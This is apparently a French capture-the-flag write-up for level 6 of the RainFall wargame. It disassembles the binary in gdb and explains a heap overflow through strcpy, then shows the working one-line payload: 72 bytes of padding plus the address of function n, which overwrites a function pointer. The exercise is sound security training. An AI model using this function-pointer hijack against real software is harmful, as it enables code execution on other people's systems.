# Level 6

```bash
(gdb) disas main 
Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   ebp
   0x08048455 <+1>:	mov    ebp,esp
   0x08048457 <+3>:	sub    esp,0x18
   0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
(gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```

Apres avoir analyse l'executable on peut remarquer que cette fois ci nous avons affaire a un `overflow` mais sur la `heap`

Copiant l'argument envoyer en parametre a l'aide la fonction `strcpy` (qui ne fait aucun check sur la taille a copier) dans un bloc memoire de `64 octets`

Si on essaye d'ajouter l'adresse de la fonction `n` a la fin de notre bloc memoire cela ne fonctionne pas

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08"')
Nope
```

Puisque en realite la taille reelle du bloc est `64 + 8` octets `8` pour les metadata du bloc

Essayons avec un padding de `72 octets`

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
*****************************************
```

Cela fonctionne car le depassement du premier chunk permet d’atteindre le bloc heap suivant et d’ecraser son contenu qui est un pointeur de fonction initialement dirige vers la fonction `m`. En le remplacant par l’adresse de la fonction `n` l’execution est redirigee vers celle ci